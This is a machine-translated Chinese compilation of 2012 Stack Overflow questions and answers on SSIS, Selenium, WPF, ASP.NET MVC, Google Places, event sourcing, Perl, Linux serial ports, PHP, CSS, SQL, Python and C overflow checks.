* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T09:20:04.317

我相信您最好的选择是使用自定义脚本组件来创建自己的。

此链接向您展示如何操作：[http ://microsoft-ssis.blogspot.pt/2011/05/download-source-file-from-website-with.html](http://microsoft-ssis.blogspot.pt/2011/05/download-source-file-from-website-with.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-11-10T17:32:07.397

库存的 HTTP 连接管理器也可用于完成此任务。将 HTTP 连接管理器添加到您的项目，并将“服务器 URL”属性设置为您希望从中下载的 URL。

这可以很容易地在脚本任务中用于下载文件，并且您可以在表达式中设置“服务器 URL”属性，以便利用变量和控制流容器来使其动态化。

[SQLIS.com - 通过 HTTP 以 SSIS 方式下载文件](http://www.sqlis.com/sqlis/post/Downloading-a-file-over-HTTP-the-SSIS-way.aspx)

# python - Python/Selenium - Chrome Web 驱动程序，点击操作

> ID：10078746
> 
> 赞同：3
> 
> 时间：2012-04-09T19:37:53.190
> 
> 标签：python, google-chrome, selenium, webdriver

我在使用 Selenium 和 Python 中的 Chrome Web 驱动程序对单击操作进行编码时遇到问题。我花了一些时间在谷歌上搜索，发现我必须使用另一个 selenium 进程才能在 Google Chrome 中进行点击，这对我来说没有意义（调用 webdrive.Chrome 时会不会是什么？） . 虽然我找不到任何其他方法来进行点击，无论是在线还是通过 seleniums 模块。

这就是我所拥有的，任何帮助表示赞赏！谢谢！

编辑：所以我在 Selenium 中找到了 ActionChains 模块，似乎也无法让它工作。更新了我的代码，仍然卡住了。ChromeDriver 真的不支持点击吗？

```
import selenium
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
import time

chromeOps = webdriver.ChromeOptions()
chromeOps._binary_location = "C:\\Applications\\Browser\\Chrome.exe"
chromeOps._arguments = ["--enable-internal-flash"]

browser = webdriver.Chrome("C:\\Applications\\Browser\\chromedriver.exe", port=4445, chrome_options=chromeOps)
time.sleep(3)

browser.get("http://example.com")

##selenium.selenium("127.0.0.1", 4445,'*Chrome.exe', 'https://example.com').click("//a[contains(@href,'http://example.com/link')]")

webdriver.ActionChains(browser).click(on_element='//a[contains(@href,"http://example.com/link")]') 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-09T20:20:58.017

我讨厌这样简单的事情就在你面前。

```
clickme = browser.find_element_by_xpath('//a[contains(@href,"http://example.com/link")]')
clickme.click() 
```

# c# - ImageButton：禁用按钮时不显示图像

> ID：10078750
> 
> 赞同：0
> 
> 时间：2012-04-09T19:38:03.957
> 
> 标签：c#, wpf, xaml, user-controls, imagebutton

我创建了一个 UserControl 来实现一个简单`ImageButton`的如下：

```
<UserControl x:Class="MyApp.Common.Controls.ImageButton"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         Name="UC">
<Grid>
    <Button Command="{Binding ElementName=UC, Path=Command}" CommandParameter="{Binding ElementName=UC, Path=CommandParameter}">
        <StackPanel Orientation="Horizontal">
            <Image Source="{Binding ElementName=UC, Path=Image}"
                   Width="{Binding ElementName=UC, Path=ImageWidth}"
                   Height="{Binding ElementName=UC, Path=ImageHeight}"/>
            <TextBlock Text="{Binding ElementName=UC, Path=Text}"  />
        </StackPanel>
    </Button>
</Grid> 
```

这是我控制的代码隐藏：

```
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;

namespace MyApp.Common.Controls
{
    public partial class ImageButton : UserControl
    {
        public ImageButton()
        {
            InitializeComponent();
        }

        public ImageSource Image
        {
            get { return (ImageSource)GetValue(ImageProperty); }
            set { SetValue(ImageProperty, value); }
        }

        public static readonly DependencyProperty ImageProperty =
            DependencyProperty.Register("Image", typeof(ImageSource), typeof(ImageButton), new UIPropertyMetadata(null));

        public double ImageWidth
        {
            get { return (double)GetValue(ImageWidthProperty); }
            set { SetValue(ImageWidthProperty, value); }
        }

        public static readonly DependencyProperty ImageWidthProperty =
            DependencyProperty.Register("ImageWidth", typeof(double), typeof(ImageButton), new UIPropertyMetadata(16d));

        public double ImageHeight
        {
            get { return (double)GetValue(ImageHeightProperty); }
            set { SetValue(ImageHeightProperty, value); }
        }

        public static readonly DependencyProperty ImageHeightProperty =
            DependencyProperty.Register("ImageHeight", typeof(double), typeof(ImageButton), new UIPropertyMetadata(16d));

        public string Text
        {
            get { return (string)GetValue(TextProperty); }
            set { SetValue(TextProperty, value); }
        }

        public static readonly DependencyProperty TextProperty =
            DependencyProperty.Register("Text", typeof(string), typeof(ImageButton), new UIPropertyMetadata(""));

        public ICommand Command
        {
            get { return (ICommand)GetValue(CommandProperty); }
            set { SetValue(CommandProperty, value); }
        }

        public static readonly DependencyProperty CommandProperty =
            DependencyProperty.Register("Command", typeof(ICommand), typeof(ImageButton));

        public object CommandParameter
        {
            get { return GetValue(CommandParameterProperty); }
            set { SetValue(CommandParameterProperty, value); }
        }

        public static readonly DependencyProperty CommandParameterProperty =
            DependencyProperty.Register("CommandParameter", typeof(object), typeof(ImageButton));
    }
} 
```

用法很简单：

```
 <cc:ImageButton Command="{Binding SearchCommand}" 
                Image="/MyApp;component/Images/magnifier.png"       
                ImageWidth="16" ImageHeight="16"        
                        /> 
```

当按钮（绑定到我的 ViewModel 中的 DelegateCommand）被禁用时，图像就会消失。否则，一切都按预期工作。可能是什么问题？禁用时如何使图像以灰度显示？

**更新**：这是这种奇怪行为的图像![截屏](../Images/276c7f98b565c5eb38b6488aaf8183a2.png)：

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T22:00:11.863

我复制了您提供的代码，以查看是否可以重现您遇到的问题。不幸的是，当命令被禁用（或它`CanExecute`正在返回`false`）时，我使用的图像并没有消失。您能否提供更多`ViewModel`您认为可能相关的代码？

要回答您问题的第二部分：

> 禁用时如何使图像以灰度显示？

据我所知，没有简单的方法可以在 WPF 中对图像进行去饱和处理。相反，我会采用@Vova 建议的方法，即降低`Opacity`图像的属性。您可以修改您提供的 UserControl XAML，如下所示：

```
<UserControl x:Class="MyApp.Common.Controls.ImageButton"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         Name="UC">
    <Grid>
        <Button Command="{Binding ElementName=UC, Path=Command}" CommandParameter="{Binding ElementName=UC, Path=CommandParameter}">

            <StackPanel Orientation="Horizontal">
                <Image Source="{Binding ElementName=UC, Path=Image}"
                   Width="{Binding ElementName=UC, Path=ImageWidth}"
                   Height="{Binding ElementName=UC, Path=ImageHeight}">
                    <Image.Style>
                        <Style TargetType="{x:Type Image}">
                            <Style.Triggers>
                                <DataTrigger Binding="{Binding  Path=IsEnabled, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type Button}} }" Value="false"  >
                                    <Setter Property="Opacity" Value="0.3" />
                                </DataTrigger>
                            </Style.Triggers>
                        </Style>
                    </Image.Style>
                </Image>
                <TextBlock Text="{Binding ElementName=UC, Path=Text}"  />
            </StackPanel>
        </Button>
    </Grid>
</UserControl> 
```

在上面的代码中，如果按钮的属性等于 ，我`DataTrigger`在图像的`Style`属性中添加了一个来修改图像的不透明度。`IsEnabled``false`

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T20:48:36.427

我会让它自定义控件，在`Property =isEnabled value=false`. 在图像上，我会添加一个具有一些不透明度的网格，并使用该触发器控制该不透明度或可见性。祝你好运。我认为没有更简单的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T05:52:16.350

如前所述，WPF 中没有内置的去饱和支持，但您可以轻松地使用[着色器效果](http://bursjootech.blogspot.de/2008/06/grayscale-effect-pixel-shader-effect-in.html)来实现它。该链接将您带到一个实现，该实现允许您以仅 XAML 的方式使用该效果。

请注意，对于用 HLSL 编写的着色器，需要编译，并且要进行编译，您需要在您的机器上安装 Direct X SDK。承认，对于这样一个小任务来说，这真是一个野兽。

# asp.net-mvc - RouteData 在由 RenderAction 调用的控制器中的 Post 上丢失

> ID：10078753
> 
> 赞同：0
> 
> 时间：2012-04-09T19:38:06.203
> 
> 标签：asp.net-mvc, renderaction, routedata

我有一个“简历”视图，它调用 RenderAction，以便我可以在简历中添加评论。代码：

```
 @{Html.RenderAction("Add", "ResumeComment", new { resumeId = @Model.Id });} 
```

所以上面的代码在我的 ResumeComment 控制器中调用 Add action 并将它传递给 resumeId。如果我查看 Add (GET) 方法中的 ControllerContext.ParentActionViewContext.RouteData，我会看到 4 个值：

```
PL <- which is resume category
954 <- resume id
Resume <- Controller
Edit <- Action, because I am adding comments on the Edit page in the resume.

The problem that I have is that I am loosing resume category (PL) and resume id(954) when I post (add a comment). Here is my ResumeComment form:

    @using (Html.BeginForm("Add", "ResumeComment"))
    {
    ...
    <input type="submit" value="Add Comment" />   

    ..}

So this form will call Add (Post) method in the ResumeComment controller when sumitted. Here is my add method:

    [HttpPost, ActionName("Add")]  
    public ActionResult Add(ResumeComment resumeComment)
    {
    .....
    }

I am not able to access ControllerContext.ParentActionViewContext.RouteData at all, it is null. I am however able to access ControllerContext.RouteData but when I look at the values I only see "ResumeComment" and "Add" in there and that is it. How can I preserve the resume category and resume id? 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:01:11.453

您可以使用[TempData](http://www.gregshackles.com/2010/07/asp-net-mvc-do-you-know-where-your-tempdata-is/) - 类似会话，但一旦您从中读取数据，就会被删除。在两个顺序请求之间存储临时数据是一个很好的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:54:45.307

如果您想在表单中发布一些值，则`ResumeComment.Add`需要将它们放入隐藏输入中。`RouteData`在请求之间不会以任何神奇的方式持续存在。

# google-maps-api-3 - Google Places API 地铁站，？

> ID：10078755
> 
> 赞同：0
> 
> 时间：2012-04-09T19:38:18.623
> 
> 标签：google-maps-api-3, google-places-api

可以使用 google place API 获取地铁站信息吗？

几周前我这样做了，我的测试很好！但现在测试不起作用

谷歌更改了访问权限？

我正在测试这个：

[https://maps.googleapis.com/maps/api/place/search/json?language=ru&location=4.647604837557583,-74.07900810241699&radius=1000&sensor=false&types=subway_station|train_station&key=xxxxxxxx](https://maps.googleapis.com/maps/api/place/search/json?language=ru&location=4.647604837557583,-74.07900810241699&radius=1000&sensor=false&types=subway_station|train_station&key=xxxxxxxx)

结果：

`{ "html_attributions" : [], "results" : [], "status" : "REQUEST_DENIED" }`

我认为现在谷歌不允许地铁站的地方服务。

在另一个帖子中有人说：

[俄罗斯的 Google Places Api 地铁和火车站搜索停止工作](https://stackoverflow.com/questions/10054629/google-places-api-subway-and-train-station-search-in-russia-stopped-working)

谢谢！！！

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T04:09:08.477

此问题已在此处的 Google Places API 问题跟踪器上报告：[http ://code.google.com/p/gmaps-api-issues/issues/detail?id=4061](http://code.google.com/p/gmaps-api-issues/issues/detail?id=4061)

请单击“星号”图标以获取有关未来更改的通知，并让我们知道您有兴趣看到它得到解决。

# cqrs - 事件溯源和追溯事件

> ID：10078757
> 
> 赞同：3
> 
> 时间：2012-04-09T19:38:23.257
> 
> 标签：cqrs, event-sourcing

我需要将追溯事件合并到我的事件流中，但我不确定实现它的最佳方式。

我们需要保持原始事件流不变以进行审计和所有其他标准好处。事件流本质上也是暂时的，使我们能够查看历史上任何一点的值。即 x 的值在 6 月 1 日下午 5 点为 10.00。有时我们会在 6 月 5 日发现 x 的值实际上是 6 月 1 日下午 5 点的 12.00。在这种情况下，我们将 10.00 称为“as-at”值，将“12.00”称为 as-of 值，并在事件流中跟踪这两个值。

为 as-at 值重建状态是直接查询 6 月 1 日下午 5 点之前的最新快照以及 6 月 1 日之前的所有事件。

我犹豫的地方是重建现状。如果对模型进行了 as-of 更正，那么默认情况下应该使用它而不是 as-at，但是如果不读取整个事件流，我看不到任何方法来确定是否存在 as-of*更正*从时间点到现在（这可能很大），并且大多数更改都无关紧要，因为它们将与未来的更改相关，而不是相关的时间点。

我应该在这里看看不同的方法吗？

谢谢，克里斯

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-15T02:47:08.150

我认为您指的是[双时态](http://en.wikipedia.org/wiki/Temporal_database#Bitemporal_Relations)数据模型。也就是说，您不仅可以回答“谁赢得了 2000 年美国总统大选”，还可以回答“我们认为谁赢得了 2000 年选举日晚上的美国总统大选”。

通常，您的事件流不一定是为了有效地回答您的所有查询和双时态查询而构建的。它只是你所学到的事实的历史。如果您今天了解有关去年的事实，它仍然属于您的事件流的*末尾，但标有相关日期。*

查询此数据的最佳方式取决于您要回答的问题类型。有几篇关于如何构建时态和双时态数据库模式的[好论文](http://www.cs.arizona.edu/people/rts/tdbbook.pdf)，这些模式将由从事件流馈送的投影仪填充。

# perl - 可以使用 XPath 的 setNodeText 函数保存到磁盘吗？

> ID：10078759
> 
> 赞同：0
> 
> 时间：2012-04-09T19:38:35.313
> 
> 标签：perl, xpath

我正在使用像“学校/学生 [4]”这样的 XPath。该`setNodeText`功能可以保存到硬盘吗？我的更改似乎只在内存中进行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T04:22:37.230

如果我理解正确，您正在尝试更改文档然后将其写入磁盘。

```
use XML::LibXML qw( );

my $parser = XML::LibXML->new();
my $doc    = $parser->parse_fh(...);
my $root   = $doc->documentElement();

for my $node ($root->findnodes('//school/student[4]')) {
   $node->removeChildNodes();
   $node->appendText("New text");
}

open(my $fh, '>:raw', ...) or die $!;
print($fh $doc->toString()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-31T07:57:33.870

您可以使用未记录的方法转储 XML 结构`getNodeAsXML`。不保证输出是有效的 XML（例如没有标题），但它通常可以解决问题。

```
my $str = $xp->getNodeAsXML();
print $str; 
```

资料来源：[http ://www.perlmonks.org/?node_id=567212](http://www.perlmonks.org/?node_id=567212)

# c++ - 确定是否存在串行端口，Linux C/C++

> ID：10078764
> 
> 赞同：2
> 
> 时间：2012-04-09T19:39:01.023
> 
> 标签：c++, c, linux, serial-port

我的开发目标是一台 Linux 计算机，它有两个物理串行端口位于 /dev/ttyS0 和 /dev/ttyS1。我还希望定义 /dev/ttyS2 和 /dev/ttyS3。

使用 stty -f /dev/ttyS0 和 S1 报告两个串行端口的配置，并报告 S2 和 S3 的“不存在”的东西。

硬件设计人员正在讨论提供 USB 到内置于主板上的串行端口。它们将是外部的 DB9 连接器，只是电路 - 内部没有 USB 连接器。无法保证 USB 到串行连接的数量，我知道足以设计“许多”而不是一个。

因此，在设置我的端口服务器守护进程时，我需要能够确定哪些 ttyS 和哪些 ttyUSB 是“真实的”，哪些不是。会有占位符 ttyUSB 吗？如果要“拔掉插头”（假设它确实是 PC 内部真正的 USB 耦合器）怎么办？

有比 popen()ing stty 并检查其输出以确定串行端口的状态更好的方法吗？stty 有 C API 吗？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T19:45:40.867

stty 使用的“C-API”是`tcsetattr(3)`and `tcgetattr(3)`。

要在不打开设备的情况下查找 TTY，您可以查看以下问题：

[如何在不打开 Linux 的情况下找到所有串行设备（ttyS、ttyUSB、..）？](https://stackoverflow.com/questions/2530096/how-to-find-all-serial-devices-ttys-ttyusb-on-linux-without-opening-them/9914339#9914339)

# php - 通过 php 加载图像、css 或 js 文件

> ID：10078766
> 
> 赞同：0
> 
> 时间：2012-04-09T19:39:09.590
> 
> 标签：php

我正在制作自己的框架，并希望能够轻松地直接访问资产文件，例如图像、javascript 或 css 文件。

目前我正在尝试允许使用

```
<link rel="stylesheet" href="/assets/css/style.css" /> 
```

我有我的 .htaccess 文件捕获 URI 并允许我使用 PHP 操作它。

我的路由器类捕获 uri 并检测文件的实际路径。所以我的问题是我如何用 PHP 编写它？

```
public function router($file)
{
    //output assets file here
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T19:41:18.350

```
public function router($file) {
    // Only do this if the file is a valid type to be outputted;
    // It would be bad if someone started viewing your PHP.
    if (file_exists($file)) {
        readfile($file);
    }
} 
```

# javascript - 根据文本换行和窗口宽度（Jquery 或 JavaScript）更改 CSS 类

> ID：10078770
> 
> 赞同：0
> 
> 时间：2012-04-09T19:39:31.940
> 
> 标签：javascript, jquery, css, class, vertical-alignment

我有一个带有一些文本列的响应式设计。列有 h2 标题，并且浮动到标题左侧的是图像图标 - 很好地垂直居中于标题文本。当我缩小窗口宽度时会出现问题。当单标题线换行时，它们不再与图标垂直对齐。

基本上，我正在尝试编写一个脚本，告诉标题的类在它换行到两行时发生变化，以便我可以将它的垂直位置更改为居中。

我对脚本很陌生，所以我不确定如何编写它，但本质上就是这样：

```
if window width > 768 and if lines of text in #services h2 = 1

#services h2 {
top:9px;
}

else

if window width > 768 and if lines of text in #services h2 > 1

#services h2 {
top:1px;
} 
```

有人可以帮我正确格式化吗？我已经将 jQuery 用于其他一些东西，所以如果可以这样做，那就太好了。

谢谢！

**编辑：**其中最重要的部分是当一行从 1 行换行到 2 行时更改类属性。这是关键部分：

```
if lines of text in #services h2 = 1

#services h2 {
top:9px;
}

else

if lines of text in #services h2 > 1

#services h2 {
top:1px;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T19:53:26.030

你能不能把背景图片的垂直位置设置为50%？而不是将 js 添加到一个相对较小的外观变化中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:48:24.217

不需要 JavaScript（包括 jQuery），使用纯 CSS：[http](http://www.css3.info/preview/media-queries/) ://www.css3.info/preview/media-queries/ 。

可以在[http://css-tricks.com/css-media-queries/找到更长的解释](http://css-tricks.com/css-media-queries/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-09T19:46:16.080

我不确定“and if 文本行”，但 AND 的左侧将是：

-编辑- 我明白了，看看这是否是你想要的。

```
$(window).resize(function(){
     var h =$('#services h2').css('line-height');
     var size = $(window).width();
     if (size > 768){
          if( $('#services h2').height() == h){
                 $('#services h2').css('top','1px')
          }
     }else{
           if( $('#services h2').height() > 2*h){
                 $('#services h2').css('top','9px')
          }
     }

}); 
```

# sql - 选择包含一张或多张图片的画廊

> ID：10078772
> 
> 赞同：0
> 
> 时间：2012-04-09T19:39:59.037
> 
> 标签：sql

我对 SQL 语句有疑问。我有属于一个类别（实体）的实体画廊。然后我有实体 GalleryImages 并且存储了特定画廊的图像。图库可以有很多图片，但图库也可以没有图片（还没有添加图片）。

现在我想构建 SQL 查询来选择具有一个或多个图像并且属于某个类别的 (DESC) Gallery。

类别（ID、名称）

图库（id、名称、category_id）

GalleryImages（id，gallery_id，路径）

类别 -> 图库（一对多）图库 -> GalleryImages（一对多）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T20:00:19.120

嗯 - 看起来基本问题已经得到解答。但是你的设置让我有点不快......
我想我会稍微重组一下你的表格（假设国际化不是问题）。除其他外，我认为“类别”和“画廊”的概念之间没有根本区别。现在，可能有“超级”和“子”类别/画廊，并且图像可能同时属于多个（即，来自 Renniasance、米开朗基罗、雕塑等）。它类似于标签的概念。

我可能会将您的表格修改为：

```
Gallery (or Category, if you prefer)
=============
id  -- autoincrement
name  -- varchar(50) or something, unique
parent  -- fk reference to another Gallery.id row, optional

Image 
==========
id  -- autoincrement
name  -- varchar(50) or similar, non-unique
path  -- store as URI/URL, unique
description  -- varchar(128) or similar

Gallery_Image
===============
galleryId  -- fk reference to Gallery.id
imageId  -- fk reference to Image.id
         -- the pair is unique

Related_Gallery  -- optional table
================
galleryId  -- fk reference to Gallery.id
relationship  -- code, or fk reference to other table
relatedId  -- fk reference to Gallery.id
           -- entire row should be unique
           -- somewhat tricky to use. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:42:52.677

尝试这个：

```
SELECT *
FROM Gallery as G
WHERE 
    G.category_id = 1
    AND G.id in (SELECT gallery_id FROM GalleryImages ) 
```

将 1 替换为您要选择的 caregory_id。

# php - 如何正确拦截 PHP 中的 404 错误？

> ID：10078773
> 
> 赞同：2
> 
> 时间：2012-04-09T19:40:06.593
> 
> 标签：php, http-headers, http-status-code-404, errordocument

本质上，我正在做的是使用 .htaccess 中的 ErrorDocument 拦截 404，并将其指向 getFile.php。getFile 然后从 url 中获取文件名并在 mysql 数据库中搜索它，获取数据并应用适当的标题。

在我的开发环境（在 ubuntu 下运行的最新 LAMP 服务器）中，一切似乎都运行良好，但是该站点托管在 GoDaddy 上，并且返回的标头似乎存在一些问题。我认为 GoDaddy 返回 404，然后仍然发送数据。

结果是当我右键单击要以这种方式处理的链接时，我可以“另存为”，一切正常。如果文件是图像，则打开没有问题。但是，如果我只是单击链接并且它是要下载而不是在浏览器中查看的文件，我会在所有浏览器中收到“找不到文件”错误。Firebug 控制台声称这是一个 404 错误，无论文件是否成功传输。我的代码如下：

```
$folder = explode( "/" , $_SERVER["REQUEST_URI"] );
$pageName = $folder[sizeof($folder)-1];

$sql = "SELECT data, mimeType, OCTET_LENGTH(data) AS size FROM tblFiles WHERE fileName = '".$pageName."' AND active=1;";

$result = mysql_query("$sql") or die();

$data = mysql_fetch_array($result);

header("HTTP/1.0 200 OK");
header("Content-Type: ".$data['mimeType']);
header("Content-Length: ".$data['size']);

echo $data['data']; 
```

和 .htaccess 文件：

```
ErrorDocument 404 /FILES/dbFiles/getFile.php 
```

现在这是 /FILES/dbFiles 中的完整 .htaccess 文件。我不知道 GoDaddy 是否期待那里有更多的东西，但它似乎就像在我自己​​的服务器上写的一样工作。

我尝试了多种标题信息组合，但没有任何积极影响。

我的代码显然有效，但我似乎无法阻止 404 发生。

谢谢！-杰尔

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T20:25:40.207

在你的文件中试试这个`/FILES/dbFiles/.htaccess`（没有 ErrorDocument 部分）：

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^.*$ getFile.php?file=$0 [QSA,L] 
```

这会将所有不存在的 URL 定向到您的`getFile.php`脚本，而不会生成 404。如果脚本在您的数据库中找不到内容，请确保您*确实输出了 404。*

在您的 PHP 文件中，使用：

```
if(@$_GET['file']) {

    //Your code here.  Use $_GET['file'] instead of $_SERVER["REQUEST_URI"]

} else {
    //Weird.  This file was directly accessed.
    die();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-29T07:22:19.717

哦，伙计，很好的解决方案。我的情况是这样的：当请求的 .js 文件不存在时，我正在从另一个目录流式传输 javascript 内容，虽然 javascript 的实际内容返回得很好，但状态是 404。

就我的目的而言，这是有帮助的，希望它也能帮助其他人：

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule (.*) route/index.php [L,QSA] 
```

# python - 为什么在 OO 设置中迭代时不能删除列表元素？

> ID：10078777
> 
> 赞同：2
> 
> 时间：2012-04-09T19:41:05.313
> 
> 标签：python, class, blackjack

我的情况如下：我正在研究 BlackJack 的实现。我有卡片、手牌、玩家、甲板和游戏的课程。主要的游戏对象存储玩家和一副牌，而玩家存储存储卡片的手。

我经常做类似以下的事情。在这个例子中，我将初始牌发给每个玩家。

```
num_cards = 2
for player in self.players:
    new_hand = Hand()
    for i in range(num_cards):
        new_hand.add_card(self.deck.get_next_card())
    player.assign_hand(new_hand) 
```

这非常有效。我现在的问题是我希望从玩家的手牌中删除一手牌（玩家可以在二十一点中分裂，导致生成多只手）。在下面的函数中，我打算循环遍历每个玩家的手牌。如果hand的值大于21，我想删除hand。（请注意，下面的 remove() 功能通常在 Player 类中执行，通过名为 fold_hand() 的 Player 方法调用。我遇到了同样的问题，因此为了说明目的，我将代码移到了更明显的地方。）

```
for player in self.players:
    for hand in player.hands:
        if hand.smallest_value() > 21:
            player.hands.remove(hand) 
```

这不起作用。需要明确的是，我能够在 remove() 行之前打印出手，之后不会打印出来。也就是说，它似乎被删除了。然而，在下一轮比赛中，手又回来了。因此，玩家的手每回合都会增长。

上面的代码在 Game 类中名为 validate_player_hands() 的函数中。此函数从名为 play.py 的文件中调用，该文件用于开始/结束游戏并促进主游戏循环。因此，对 validate_player_hands() 的唯一调用是在 play.py 文件中，在游戏循环中缩进一个。我打电话：

```
game.validate_player_hands() 
```

我也试过找到手的索引并使用'del'关键字，但结果是一样的。

为什么列表元素（名为 player.hands 的列表中的 Hand 对象）看起来已被删除时无法删除？

提前致谢，

典范RG

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T20:00:56.077

如何使用简单的列表推导来消除手牌：

```
for player in self.players:
    player.hands = [hand for hand in player.hands if hand.smallest_value() <= 21] 
```

**编辑**

带过滤器：

```
for player in self.players:
    player.hands = filter(lambda x: x.smallest_value() <= 21, player.hands) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T19:52:52.127

创建一个副本并使用与对象长度相关的索引遍历对象。将要删除的每个元素设置为 0，然后过滤指针以清除零。

```
for player in self.players:
    for hand_idx in range(len(player.hands)):
        if player.hands[hand_idx].smallest_value() > 21:
            player.hands[hand_idx]=0
    player.hands=filter(None,hands) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T20:01:40.453

您将需要执行以下操作：

```
newList = hands[:]   
for hand in newList:  
    if hand.smallest_value() > 21:  #your code here
            player.hands.remove(hand) 
```

这允许您在迭代该副本时制作要修改的列表副本，从而避免 Mihai 提到的“树枝”场景。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-09T20:24:16.513

这可以通过添加`[:]`到“for”语句的末尾来解决。这将创建列表的副本。然后，您可以在更改原始列表的同时遍历副本：

```
for player in self.players:
    for hand in player.hands[:]:
        if hand.smallest_value() > 21:
            player.hands.remove(hand) 
```

（这是 Python 的[列表切片](http://docs.python.org/tutorial/introduction.html#lists)语法。它是复制列表的[最快](https://stackoverflow.com/a/2612990/37386)方法之一。更常见的是，这种语法在表单`some_list[3:8]`中用于获取从索引 3 到 7（含）的列表条目，但是通过省略第一个数字，您可以获得从列表的开头开始的所有内容，并且通过省略最后一个数字，您可以将所有内容都放在列表的末尾）。

# c - c中的按位溢出检查

> ID：10078778
> 
> 赞同：4
> 
> 时间：2012-04-09T19:41:06.687
> 
> 标签：c, overflow, bit-manipulation, operations

我正在尝试编写两个函数来检查/防止 c 中的溢出（仅使用！~ | & ^ +）但无法获得它。第一个是某些二进制补码/有符号整数将适合一定数量的位：fitsB(int x, int n) 其中是 int，n 是要使用的位大小。还有一个函数将检查两个整数相加时是否不会溢出：overflowInt(int x, int y)。如果它们是无符号整数，我可以得到它，但负数只会让我更难。有谁知道怎么做？

也没有强制转换，整数总是 32 位

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-02-08T18:49:57.727

```
/* 
 * addOK - Determine if can compute x+y without overflow
 *   Example: addOK(0x80000000,0x80000000) = 0,
 *            addOK(0x80000000,0x70000000) = 1, 
 *   Legal ops: ! ~ & ^ | + << >>
 *   Max ops: 20
 *   Rating: 3
 */
 int addOK(int x, int y) {
  // Find the sign bit in each word
  //if a and b have different signs, you cannot get overflow.
  //if they are the same, check that a is different from c and b is different from c, 
  // if they are the same, then there was no overflow.
  int z=x+y;
  int a=x>>31;
  int b=y>>31;
  int c=z>>31;
  return !!(a^b)|(!(a^c)&!(b^c));
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T19:45:23.253

如果 x < 2^(n-1)，x 将适合 n 位。

溢出问题需要更多信息。如果将它们分配给 long（或 double），则两个 int 不会溢出。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T00:41:02.513

使用上面的示例（Adam Shiemke），您可以找到最大值（正）和最小值（负）以获得 n 位数的范围。2^(n-1) （来自 Adam 的示例），减一表示可以用 n 位表示的最大/正数。对于最小值，取反 2^(n-1) 得到最小值 x => -(2^(n-1)); （注意最小范围的 >= 不是 >）。例如，对于 n = 4 位，2^(4-1) - 1 = 2^3 -1 = 7 所以 x <= 7 且 x >= -8 = (-(2^(4-1))。

这假设初始输入不会溢出 32 位数量（希望在这种情况下会发生错误）并且您使用的位数小于 32（因为您为负范围添加 1 并且如果您有 32 位，它会溢出，请参阅下面的解释）。

要确定加法是否会溢出，如果您有最大值，则 x + y <= 最大值。通过使用代数，我们可以得到 y <= 最大值 - x。然后您可以比较传入的 y 值，如果不满足条件，则加法将溢出。例如，如果 x 是最大值，则 y <= 0，因此 y 必须小于或等于 0，否则加法将溢出。

# distinct - 通过 xQuery 获得不同的结果

> ID：10078782
> 
> 赞同：1
> 
> 时间：2012-04-09T19:41:18.023
> 
> 标签：distinct, xquery

我试图让评论者对 2010 年之后出版的一本或多本书进行评论。

```
for $r in doc("review.xml")//Reviews//Review,
    $b in doc("book.xml")//Books//Book
where $b/Title = $r/BookTitle
    and $b/Year > 2010
return {$r/Reviewer} 
```

以下都是 XML 文件。

审查.xml：

```
<Reviews>
    <Review>
        <ReviewID>R1</ReviewID>
        <BookTitle>B1</BookTitle>
        <Reviewer>AAA</Reviewer>
    </Review>
    <Review>
        <ReviewID>R2</ReviewID>
        <BookTitle>B1</BookTitle>
        <Reviewer>BBB</Reviewer>
    </Review>
    <Review>
        <ReviewID>R3</ReviewID>
        <BookTitle>B2</BookTitle>
        <Reviewer>AAA</Reviewer>
    </Review>
    <Review>
        <ReviewID>R4</ReviewID>
        <BookTitle>B3</BookTitle>
        <Reviewer>AAA</Reviewer>
    </Review>
<Reviews> 
```

书.xml：

```
<Books>
    <Book>
        <Title>B1</Title>
        <Year>2005</Year>
    </Book>
    <Book>
        <Title>B2</Title>
        <Year>2011</Year>
    </Book>
    <Book>
